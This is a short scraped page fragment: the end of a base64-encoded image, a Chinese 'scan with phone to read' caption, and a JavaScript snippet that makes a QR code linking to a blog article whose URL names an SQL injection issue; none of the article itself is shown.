8JbAOBTAue49kt+jSs8tOfHLIP61/55vZoDTzvZc3Mr7i6dSLkPvoQvvLN6RduAylyrZ8/gWsgPz+DtoP/AAAA//8lN6NNAAAABklEQVQDAPN7+JvBrXTvAAAAAElFTkSuQmCC)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/netmizer-data-login-getlogin-usersessionid-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 